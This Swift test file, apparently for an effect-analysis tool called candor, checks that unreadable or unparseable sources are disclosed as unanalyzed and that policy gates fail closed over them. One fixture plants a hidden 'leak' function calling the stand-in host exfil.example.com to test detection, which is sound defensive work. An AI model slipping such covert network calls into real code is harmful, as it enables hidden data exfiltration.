import XCTest
import Foundation
@testable import CandorCore

/// ⟨0.21⟩ The completeness manifest (COMPLETENESS-MANIFEST-DESIGN.md): distinguish provably-pure from
/// never-seen, and make incompleteness MACHINE-legible so a --gate-json/agent consumer can't read
/// `ok:true` over source candor never analyzed. Ports the candor-java reference (CompletenessManifestTest).
///
/// - Gap 1 — the report envelope carries `analyzed:{count,digest}`; the count is the analyzed universe
///   (pure leaves included, so it exceeds |functions|); the digest is stable across a same-input re-scan.
/// - Gap 2 — an UNREADABLE source file appears in the report's `unanalyzed`, and a CONFIGURED gate over it
///   fails closed: the verdict carries `ok:false, incomplete:true, unanalyzed:[…]` and the run exits 2
///   (could-not-evaluate) — never a green gate over unseen code. A real violation still exits 1.
final class CompletenessManifestTests: XCTestCase {

    /// An app with one effectful fn (Fs) and one PURE fn → the analyzed universe exceeds |functions|.
    private func app() throws -> URL {
        try ProcessHarness.makePackage(#"""
        import Foundation
        func reads() { _ = try? String(contentsOfFile: "/tmp/x", encoding: .utf8) }
        func pure(_ x: Int) -> Int { return x + 1 }
        """#)
    }

    /// Add an UNREADABLE .swift to the package's source dir (invalid UTF-8 so `String(contentsOfFile:)`
    /// returns nil — the try? failure that Driver silently skipped). Returns the file path.
    @discardableResult
    private func addUnreadable(_ root: URL, name: String = "App") throws -> String {
        let bad = root.appendingPathComponent("Sources/\(name)/Corrupt.swift")
        // 0xFF 0xFE are not valid UTF-8 lead bytes → `String(contentsOfFile:encoding:.utf8)` returns nil.
        try Data([0xFF, 0xFE, 0xFF, 0xFE]).write(to: bad)
        return bad.path
    }

    // Gap 1 (a): analyzed.count > effectful count for a fixture with a pure fn; (d) digest stable on re-scan.
    func testAnalyzedSummaryExceedsEffectfulCountAndDigestIsStable() throws {
        let bin = try ProcessHarness.binaryURL(for: type(of: self))
        let root = try app()
        defer { try? FileManager.default.removeItem(at: root) }

        let r1 = try ProcessHarness.run(bin, [root.path, "--json"])
        XCTAssertEqual(r1.code, 0, r1.err)
        let env1 = try JSONSerialization.jsonObject(with: Data(r1.out.utf8)) as? [String: Any]
        let analyzed1 = env1?["analyzed"] as? [String: Any]
        XCTAssertNotNil(analyzed1, "the envelope always carries the completeness manifest")
        let count = analyzed1?["count"] as? Int ?? -1
        let functions = (env1?["functions"] as? [Any])?.count ?? 0
        XCTAssertGreaterThan(count, functions,
            "analyzed count includes pure fns the report omits (count=\(count), |functions|=\(functions))")
        let digest1 = analyzed1?["digest"] as? String ?? ""
        XCTAssertEqual(digest1.count, 16, "the digest is 16 hex chars")
        XCTAssertTrue(digest1.allSatisfy { $0.isHexDigit && ($0.isNumber || $0.isLowercase) },
                      "the digest is lowercase hex")
        XCTAssertNil(env1?["unanalyzed"], "a complete scan carries no `unanalyzed` (byte-compatible)")

        // (d) the digest is stable across a same-input re-scan.
        let r2 = try ProcessHarness.run(bin, [root.path, "--json"])
        let env2 = try JSONSerialization.jsonObject(with: Data(r2.out.utf8)) as? [String: Any]
        let digest2 = (env2?["analyzed"] as? [String: Any])?["digest"] as? String ?? ""
        XCTAssertEqual(digest1, digest2, "the analyzed-set digest is stable across a same-input re-scan")
    }

    // Gap 2 (b): an unreadable file → `unanalyzed` in the report (bare scan still exit 0).
    func testUnreadableSourceIsMachineLegibleInTheReport() throws {
        let bin = try ProcessHarness.binaryURL(for: type(of: self))
        let root = try app()
        defer { try? FileManager.default.removeItem(at: root) }
        try addUnreadable(root)

        let r = try ProcessHarness.run(bin, [root.path, "--json"])
        XCTAssertEqual(r.code, 0, "a bare scan does not fail on an unreadable file — it discloses it")
        let env = try JSONSerialization.jsonObject(with: Data(r.out.utf8)) as? [String: Any]
        let un = env?["unanalyzed"] as? [[String: Any]]
        XCTAssertEqual(un?.count, 1, "the unreadable file is machine-legible in the report's `unanalyzed`")
        XCTAssertTrue((un?.first?["path"] as? String ?? "").contains("Corrupt"),
                      "the unanalyzed entry names the offending file")
        XCTAssertEqual(un?.first?["reason"] as? String, "source failed to read")
    }

    /// A FILE THAT DID NOT PARSE IS UNANALYZED TOO — and this engine could not tell until now, because
    /// `Parser.parse` is error-TOLERANT: it always returns a tree and never throws, so a syntax error was
    /// indistinguishable from clean source and the file counted as fully analyzed.
    ///
    /// The consequence is not a missing hedge, it is a GREEN GATE OVER Net. Error recovery folds the
    /// declarations after the bad token into the broken function's body, so the effect is MISATTRIBUTED
    /// rather than lost — and the real owner vanishes from `functions`, which under ⟨0.21⟩ is a positive
    /// claim of PURITY over a function that performs Net. Measured before the fix, two trees whose only
    /// difference is one unparseable declaration:
    ///
    ///     well-formed        functions: [Hidden.leak -> Net]    `deny Net Hidden`  exit 1
    ///     one syntax error   functions: [nope -> Net]           `deny Net Hidden`  exit 0, ok: true
    ///
    /// Found by conformance PART 29 (P5, incomplete-vs-violation dominance) on its first honest run.
    ///
    /// BOTH DIRECTIONS ARE ASSERTED. The clean control matters as much as the failing row: hedging on
    /// parser WARNINGS instead of errors, or on any diagnostic at all, would flood `unanalyzed` with files
    /// candor read perfectly well — and a manifest that cries wolf is how the disclosure channel stops
    /// being read.
    func testSourceThatFailedToParseIsUnanalyzedAndTheGateFailsClosed() throws {
        let bin = try ProcessHarness.binaryURL(for: type(of: self))
        let root = try app()
        defer { try? FileManager.default.removeItem(at: root) }
        let bad = root.appendingPathComponent("Sources/App/Broken.swift")
        try #"""
        import Foundation
        func nope( {{{ <<< not swift
        enum Hidden {
            static func leak() {
                _ = URLSession.shared.dataTask(with: URL(string: "https://exfil.example.com/x")!)
            }
        }
        """#.write(to: bad, atomically: true, encoding: .utf8)

        let r = try ProcessHarness.run(bin, [root.path, "--json"])
        XCTAssertEqual(r.code, 0, "a bare scan discloses rather than failing: \(r.err)")
        let env = try JSONSerialization.jsonObject(with: Data(r.out.utf8)) as? [String: Any]
        let un = env?["unanalyzed"] as? [[String: Any]]
        XCTAssertEqual(un?.count, 1, "the unparseable file must be machine-legible in `unanalyzed`")
        XCTAssertTrue((un?.first?["path"] as? String ?? "").contains("Broken"),
                      "the entry names the offending file")
        XCTAssertTrue((un?.first?["reason"] as? String ?? "").contains("failed to parse"),
                      "…and says it was a PARSE failure, distinct from the unreadable-file reason")

        // THE GATE, which is where this cost something: `deny Net Hidden` read GREEN before the fix.
        let pol = root.appendingPathComponent("net.policy")
        try "deny Net Hidden\n".write(to: pol, atomically: true, encoding: .utf8)
        let verdict = root.appendingPathComponent("v.json")
        let gated = try ProcessHarness.run(bin, [root.path, "--policy", pol.path, "--gate-json", verdict.path])
        XCTAssertNotEqual(gated.code, 0,
            "a gate cannot be GREEN over a file that did not parse — this exited 0 with ok:true while the "
            + "unparsed region performs Net: \(gated.err)")
        let v = try JSONSerialization.jsonObject(with: Data(contentsOf: verdict)) as? [String: Any]
        XCTAssertEqual(v?["ok"] as? Bool, false, "ok:false — the gate did not certify")
        XCTAssertEqual(v?["incomplete"] as? Bool, true, "and the verdict says WHY, machine-readably")
    }

    /// THE CONTROL FOR THE ROW ABOVE, and it is the half that keeps the fix honest: a package whose files
    /// all parse must record NO `unanalyzed` at all. Without this, "detect parse errors" and "hedge on
    /// everything" are indistinguishable, and the second passes the row above just as well.
    func testACleanPackageRecordsNoParseFailure() throws {
        let bin = try ProcessHarness.binaryURL(for: type(of: self))
        let root = try app()
        defer { try? FileManager.default.removeItem(at: root) }
        let r = try ProcessHarness.run(bin, [root.path, "--json"])
        XCTAssertEqual(r.code, 0, r.err)
        let env = try JSONSerialization.jsonObject(with: Data(r.out.utf8)) as? [String: Any]
        XCTAssertNil(env?["unanalyzed"],
                     "a package that parses cleanly must carry no `unanalyzed` — a manifest that cries "
                     + "wolf is how the disclosure channel stops being read")
    }

    // Gap 2 (c): a configured gate over it → verdict {ok:false, incomplete:true, unanalyzed:[…]} + exit 2;
    // and a real violation still dominates (exit 1) while still disclosing the incompleteness.
    func testConfiguredGateOverUnanalyzedFailsClosed() throws {
        let bin = try ProcessHarness.binaryURL(for: type(of: self))
        let root = try app()
        defer { try? FileManager.default.removeItem(at: root) }
        try addUnreadable(root)

        // (c) a CONFIGURED gate that finds NO violation still cannot certify → exit 2, verdict incomplete.
        let pol = root.appendingPathComponent("no-db.policy")
        try "deny Db\n".write(to: pol, atomically: true, encoding: .utf8)   // the app performs Fs, not Db
        let verdict = root.appendingPathComponent("v.json")
        let gated = try ProcessHarness.run(bin, [root.path, "--policy", pol.path, "--gate-json", verdict.path])
        XCTAssertEqual(gated.code, 2, "a gate over unanalyzed code cannot be green — exit 2 (could-not-evaluate)")
        let v = try JSONSerialization.jsonObject(with: Data(contentsOf: verdict)) as? [String: Any]
        XCTAssertEqual(v?["ok"] as? Bool, false, "ok:false — the gate did not certify")
        XCTAssertEqual(v?["incomplete"] as? Bool, true, "incomplete:true")
        let vun = v?["unanalyzed"] as? [[String: Any]]
        XCTAssertEqual(vun?.count, 1, "the verdict names the unanalyzed unit (a machine learns WHY)")
        XCTAssertNotNil(v?["analyzed"] as? [String: Any], "the verdict mirrors the report's analyzed summary")
        XCTAssertNotNil((v?["analyzed"] as? [String: Any])?["count"] as? Int)

        // a real violation still dominates (exit 1), and the verdict still discloses incompleteness.
        let pol2 = root.appendingPathComponent("no-fs.policy")
        try "deny Fs\n".write(to: pol2, atomically: true, encoding: .utf8)  // the app performs Fs → a violation
        let verdict2 = root.appendingPathComponent("v2.json")
        let gated2 = try ProcessHarness.run(bin, [root.path, "--policy", pol2.path, "--gate-json", verdict2.path])
        XCTAssertEqual(gated2.code, 1, "a real violation outranks the incompleteness (exit 1)")
        let v2 = try JSONSerialization.jsonObject(with: Data(contentsOf: verdict2)) as? [String: Any]
        XCTAssertEqual(v2?["incomplete"] as? Bool, true, "the incompleteness is still disclosed on a violating run")
    }

    /// ⟨0.24⟩ **THE RULE THE GATE HAS ENFORCED SINCE ⟨0.21⟩ WAS ABSENT FROM EVERY OTHER SURFACE THAT
    /// ANSWERS `ok`** (SPEC §3.2, candor-spec `0075987`). candor-ts measured its MCP `candor_gate`
    /// answering `{"ok":true}` over a report declaring `unanalyzed` where its CLI exits 2; this engine
    /// ships no MCP and no LSP, so the equivalent surfaces are its other machine-output verbs — and two of
    /// them had the same hole, with `--strict` making each an actual CI gate:
    ///
    ///     gate --report R --policy P          exit 2   ok:false  incomplete:true + manifest
    ///     unverified --strict …               exit 0   ok:TRUE
    ///     fix-gate   --strict …               exit 0   ok:TRUE
    ///
    /// THE ANSWER IS `whatif`'S, NOT THE GATE'S. These verbs are advisory: `ok:false` does not mean "did
    /// not certify", it means "a hole/crossing EXISTS, here it is". Answering `false` beside an EMPTY
    /// array would assert a finding the analysis never made — the fabrication mirror — and `true` over a
    /// knowingly partial universe is the over-claim. So `ok` is OMITTED and `incomplete` + the manifest
    /// take its place, which is why this row asserts **ABSENT, not false**: a consumer writing
    /// `if (r.ok)` must get a falsy value without having to know in advance that it might.
    ///
    /// THE MIRROR is asserted in the same test: a COMPLETE report still carries `ok` and still exits 1
    /// under `--strict` on a real finding. Omitting the field unconditionally would trade this fail-open
    /// for the loss of the answer itself.
    func testAdvisoryVerbsOmitOkOverAnIncompleteReport() throws {
        let bin = try ProcessHarness.binaryURL(for: type(of: self))
        let root = try app()
        defer { try? FileManager.default.removeItem(at: root) }
        // `deny Db` finds nothing (the app performs Fs), so both verbs answer a clean `ok:true` — which is
        // the exact green this row is about. A firing policy would confound "incomplete" with "found
        // something" and the row would pass for the wrong reason.
        let pol = root.appendingPathComponent("no-db.policy")
        try "deny Db\n".write(to: pol, atomically: true, encoding: .utf8)

        // ── CONTROL FIRST: the report is COMPLETE, so `ok` is present and the verbs are unchanged. ──
        let rep = root.appendingPathComponent("r")
        let cleanScan = try ProcessHarness.run(bin, [root.path, "--out", rep.path])
        XCTAssertEqual(cleanScan.code, 0, cleanScan.err)
        for verb in ["unverified", "fix-gate"] {
            let r = try ProcessHarness.run(bin, [verb, "--report", rep.path, "--policy", pol.path,
                                                 "--json", "--strict"])
            let d = try JSONSerialization.jsonObject(with: Data(r.out.utf8)) as? [String: Any]
            XCTAssertEqual(d?["ok"] as? Bool, true,
                           "\(verb) over a COMPLETE report still answers `ok` — the field is omitted for "
                           + "incompleteness, never wholesale")
            XCTAssertNil(d?["incomplete"], "\(verb): a complete report is byte-compatible with before")
            XCTAssertNil(d?["unanalyzed"], "\(verb): …and carries no manifest")
            XCTAssertEqual(r.code, 0, "\(verb) --strict: nothing found, nothing unread → 0")
        }

        // ── NOW MAKE IT INCOMPLETE. One unreadable file; same code, same policy. ──
        try addUnreadable(root)
        let inc = root.appendingPathComponent("ri")
        let incScan = try ProcessHarness.run(bin, [root.path, "--out", inc.path])
        XCTAssertEqual(incScan.code, 0, incScan.err)
        // The gate's answer is the reference the two advisory verbs were measured against.
        let gate = try ProcessHarness.run(bin, ["gate", "--report", inc.path, "--policy", pol.path])
        XCTAssertEqual(gate.code, 2, "the reference: the gate cannot certify over unanalyzed code")

        for verb in ["unverified", "fix-gate"] {
            let r = try ProcessHarness.run(bin, [verb, "--report", inc.path, "--policy", pol.path, "--json"])
            let d = try JSONSerialization.jsonObject(with: Data(r.out.utf8)) as? [String: Any]
            XCTAssertNil(d?["ok"],
                         "\(verb): `ok` is ABSENT — not false. `false` would assert a finding this run "
                         + "never made, beside an EMPTY array; that is the fabrication mirror, and worse "
                         + "than the `true` it replaces. Got: \(String(describing: d))")
            XCTAssertEqual(d?["incomplete"] as? Bool, true, "\(verb): …and it says so")
            let un = d?["unanalyzed"] as? [[String: Any]]
            XCTAssertEqual(un?.count, 1, "\(verb): the manifest travels, so the reader learns WHAT was unread")
            XCTAssertTrue((un?.first?["path"] as? String ?? "").contains("Corrupt"), "\(verb): …by name")
            // The partial answer still ships (SPEC §3.2: it beats a refusal).
            XCTAssertNotNil(d?[verb == "unverified" ? "unverified" : "remedies"],
                            "\(verb): the array is still there — a partial answer that says it is partial")
            XCTAssertEqual(r.code, 0, "\(verb): advisory without --strict, exactly as before")

            // …and `--strict`, which is how CI consumes these, is now 2 (could-not-fully-evaluate) — the
            // gate's code for the same situation. NOT 1: no finding was made.
            let s = try ProcessHarness.run(bin, [verb, "--report", inc.path, "--policy", pol.path, "--strict"])
            XCTAssertEqual(s.code, 2,
                           "\(verb) --strict over an incomplete report exits 2, not the 0 that certified it")
        }
    }

    // ── ⟨0.28⟩ the DESCRIPTIVE verbs carry the manifest too ───────────────────────────────────────────
    //
    // SPEC §2 ⟨0.28⟩ widened the re-disclosure MUST from "a verb whose VERDICT could change" to *any* verb
    // whose output could read as a NEGATIVE FINDING — "a verdict, an empty result set, or a zero count".
    // The row above covers the two verbs that answer `ok`; these cover the two this engine has that answer
    // a QUESTION, and the `analyzed.count: 0` cause the manifest reader did not read at all.

    /// One hand-built §2 report at `<dir>/rep.fixture.Swift.json`, so a test can produce any row of the
    /// artifact-state table verbatim — including rows a SCAN cannot be made to emit on demand (a report
    /// that judged nothing while still naming functions is the ⟨0.24⟩ contradictory row).
    private func reportFixture(_ name: String, _ envelope: [String: Any]) throws -> String {
        let dir = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("candor-swift-comp028-\(name)-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let f = dir.appendingPathComponent("rep.fixture.Swift.json")
        try JSONSerialization.data(withJSONObject: envelope).write(to: f)
        return f.path
    }

    /// A COMPUTED property, not a `static let`: `[String: Any]` is not `Sendable`, so a stored global
    /// is a strict-concurrency error in this package's Swift 6 mode.
    private var effectfulFn: [String: Any] {
        ["fn": "transitive_leaf", "inferred": ["Fs"], "direct": ["Fs"], "loc": "main.swift:1:1"]
    }

    /// `tour` and `path` over the two nothing-judged states disclose on BOTH channels, and over an INTACT
    /// report they are silent on both.
    ///
    /// The ARMED report — `analyzed.count: 0` plus a non-empty `unanalyzed`, sidecars gone — is the
    /// standard artifact on disk after a FAILED run since the ⟨0.28⟩ arming rung, so this is not an exotic
    /// input. Measured on this engine before the rung: `tour --json` answered `{"reaches":[]}` and the
    /// prose answered *"nothing hidden — every effect sits where its name says it should"*, both at exit
    /// 0, out of a report whose own manifest names a file it could not read.
    func testDescriptiveVerbsDiscloseOverANothingJudgedReport() throws {
        let bin = try ProcessHarness.binaryURL(for: type(of: self))
        let armed = try reportFixture("armed", [
            "candor": ["version": "t", "toolchain": "swiftsyntax", "spec": "0.28"],
            "functions": [], "analyzed": ["count": 0],
            "unanalyzed": [["path": "<run>", "reason": "armed"]],
        ])
        // COUNT-0 WITH ENTRIES — the ⟨0.24⟩ contradictory row, and the one that makes this a SECOND cause
        // rather than a second spelling of the first: there is no unread FILE to name, so `unanalyzed` is
        // legitimately absent and the pre-⟨0.28⟩ reader saw a COMPLETE report. It keeps a function so the
        // verbs can still answer — an empty answer here would prove nothing about the disclosure.
        let count0 = try reportFixture("count0", [
            "candor": ["version": "t", "toolchain": "swiftsyntax", "spec": "0.28"],
            "functions": [effectfulFn], "analyzed": ["count": 0],
        ])
        let intact = try reportFixture("intact", [
            "candor": ["version": "t", "toolchain": "swiftsyntax", "spec": "0.28"],
            "functions": [effectfulFn], "analyzed": ["count": 2],
        ])

        for (state, rep) in [("armed", armed), ("count0", count0)] {
            for argv in [["tour", "3"], ["path", "transitive_leaf", "Db"]] {
                let verb = argv[0]
                // `path` over the ARMED report matches no function and FAILS LOUD (exit 2) — the strongest
                // form of not answering, and nothing for this rung to add. Only the rows that ANSWER are
                // this row's business.
                if verb == "path" && state == "armed" { continue }

                let j = try ProcessHarness.run(bin, argv + ["--report", rep, "--json"])
                XCTAssertEqual(j.code, 0, "\(state)/\(verb): THIS RUNG ADDS A CAVEAT, IT DOES NOT REFUSE")
                let d = try JSONSerialization.jsonObject(with: Data(j.out.utf8)) as? [String: Any]
                XCTAssertEqual(d?["incomplete"] as? Bool, true,
                               "\(state)/\(verb) --json: a consumer cannot tell an empty answer from an "
                               + "unexamined one without this key. Got: \(j.out)")
                XCTAssertEqual((d?["judgedNothing"] as? [String])?.count, 1,
                               "\(state)/\(verb) --json: …and the report that judged nothing is NAMED — "
                               + "the two causes want different repairs")

                // The PROSE half must move with it. One channel going quiet is the mutant this family has
                // already shipped once, and no assertion that reads JSON keys can see it.
                let t = try ProcessHarness.run(bin, argv + ["--report", rep])
                XCTAssertEqual(t.code, 0, "\(state)/\(verb): the prose route does not refuse either")
                XCTAssertTrue(t.out.contains("⚠ INCOMPLETE"),
                              "\(state)/\(verb): the prose channel discloses too. Got: \(t.out)")
                XCTAssertTrue(t.out.contains("judged NOTHING"),
                              "\(state)/\(verb): …naming the `analyzed.count: 0` cause. Got: \(t.out)")
            }
        }

        // The reassuring sentences are WITHDRAWN, not merely accompanied: a note above a line still saying
        // "nothing hidden" leaves the false all-clear in place for anyone reading the last line.
        let tourText = try ProcessHarness.run(bin, ["tour", "3", "--report", armed])
        XCTAssertFalse(tourText.out.contains("nothing hidden — every effect"),
                       "the unqualified all-clear is gone over an armed report. Got: \(tourText.out)")
        XCTAssertTrue(tourText.out.contains("nothing hidden in what candor COULD SEE"),
                      "…replaced by the weaker sentence the input licenses. Got: \(tourText.out)")

        // ── CONTROL: an INTACT report is a NO-OP on both channels, so an ordinary run stays as it was. ──
        for argv in [["tour", "3"], ["path", "transitive_leaf", "Db"]] {
            let verb = argv[0]
            let j = try ProcessHarness.run(bin, argv + ["--report", intact, "--json"])
            XCTAssertEqual(j.code, 0, "\(verb) over an intact report answers")
            let d = try JSONSerialization.jsonObject(with: Data(j.out.utf8)) as? [String: Any]
            XCTAssertNil(d?["incomplete"], "\(verb): no disclosure key on a complete report — byte-identical")
            XCTAssertNil(d?["judgedNothing"], "\(verb): …nor this one")
            XCTAssertNil(d?["unanalyzed"], "\(verb): …nor the manifest")
            let t = try ProcessHarness.run(bin, argv + ["--report", intact])
            XCTAssertFalse(t.out.contains("INCOMPLETE"),
                           "\(verb): the prose half is a no-op too — a hedge on every run trains the "
                           + "reader to ignore it. Got: \(t.out)")
        }
    }

    /// `analyzed.count: 0` MUST raise the disclosure and MUST NOT raise the EXIT CODE.
    ///
    /// This is the whole reason `mustHedge` and `isIncomplete` are separate predicates. ⟨0.24⟩ ruled
    /// count-0 *"A DISCLOSURE, NOT AN EXIT CODE"*: `gate --report` exits 0 over a judged-nothing report,
    /// so an advisory verb answering 2 there would claim it got LESS far than the gate on identical bytes
    /// — the mirror of the over-claim `--strict`'s exit 2 exists to prevent. Fold the count-0 arm into the
    /// exit predicate and this row fails; NOTHING ELSE in the tree would notice, because the conformance
    /// suite has no cell for a `--strict` advisory verb over a judged-nothing report.
    func testJudgedNothingHedgesTheAnswerWithoutTouchingTheExitCode() throws {
        let bin = try ProcessHarness.binaryURL(for: type(of: self))
        // A count-0 report that still names a function with an unrecorded `Unknown`, so `pure` leaves a
        // HOLE: the cell where the two predicates give different answers.
        let rep = try reportFixture("count0-hole", [
            "candor": ["version": "t", "toolchain": "swiftsyntax", "spec": "0.28"],
            "analyzed": ["count": 0],
            "functions": [["fn": "mystery", "inferred": ["Unknown"], "direct": ["Unknown"],
                           "unknownWhy": ["dispatch:x"], "loc": "main.swift:1:1"]],
        ])
        let dir = (rep as NSString).deletingLastPathComponent
        let pol = dir + "/pure.policy"
        try "pure mystery\n".write(toFile: pol, atomically: true, encoding: .utf8)

        // The reference for the exit code: the GATE answers 0 over these bytes.
        let gate = try ProcessHarness.run(bin, ["gate", "--report", rep, "--policy", pol])
        XCTAssertEqual(gate.code, 0,
                       "the reference: ⟨0.24⟩ fixed count-0 at the gate's exit 0, not the manifest's 2")

        let r = try ProcessHarness.run(bin, ["unverified", "--report", rep, "--policy", pol, "--json"])
        let d = try JSONSerialization.jsonObject(with: Data(r.out.utf8)) as? [String: Any]
        XCTAssertNil(d?["ok"], "count-0 withdraws `ok` — a report that judged nothing licenses it no more "
                             + "than one naming source it could not read. Got: \(r.out)")
        XCTAssertEqual(d?["incomplete"] as? Bool, true, "…and says so")
        XCTAssertNil(d?["unanalyzed"], "there is no unread FILE in the count-0 row — the key stays absent")
        XCTAssertEqual((d?["judgedNothing"] as? [String])?.count, 1, "…the OTHER manifest names the report")
        XCTAssertEqual((d?["unverified"] as? [Any])?.count, 1,
                       "the partial answer still ships: the hole this report DID show is worth naming")

        // …AND THE EXIT CODE IS UNTOUCHED. 1 = "a hole exists", the answer a COMPLETE report with the same
        // hole gives; NOT the 2 that would say candor could not evaluate what the gate just evaluated.
        let s = try ProcessHarness.run(bin, ["unverified", "--report", rep, "--policy", pol, "--strict"])
        XCTAssertEqual(s.code, 1,
                       "count-0 must NOT reach the exit-code predicate — `gate --report` exits 0 over "
                       + "these very bytes, so a 2 here claims candor got less far than the gate did")
    }

    // The digest algorithm matches java's FNV-1a-64 byte-for-byte (one spec, one algorithm).
    func testFnv1aHexIsDeterministicAndWellFormed() {
        let a = fnv1aHex(["app.pure(x:)", "app.reads()"])
        let b = fnv1aHex(["app.pure(x:)", "app.reads()"])
        XCTAssertEqual(a, b, "same input → same digest")
        XCTAssertEqual(a.count, 16)
        XCTAssertNotEqual(a, fnv1aHex(["app.reads()"]), "a different set → a different digest")
        // The empty set is the FNV offset basis with no bytes consumed = 0xcbf29ce484222325.
        XCTAssertEqual(fnv1aHex([]), "cbf29ce484222325")
        // Byte-for-byte agreement with candor-java's FNV-1a-64 over the SAME sorted quals (one algorithm,
        // one spec) — the java reference computes these exact hexes (verified out-of-band):
        XCTAssertEqual(a, "7452ef9d9bc2102a", "matches candor-java's FNV-1a-64 for the same set")
    }
}
